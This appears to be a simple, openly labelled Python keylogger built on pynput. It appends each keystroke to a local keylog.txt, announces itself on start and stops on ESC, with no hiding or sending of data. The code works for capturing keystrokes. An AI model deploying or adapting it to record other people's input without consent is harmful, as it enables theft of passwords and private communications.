from pynput import keyboard
import os

log_file = "keylog.txt"

print("Keylogger started. Press ESC to stop.")
print("Log file will be saved to:", os.path.abspath(log_file))

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
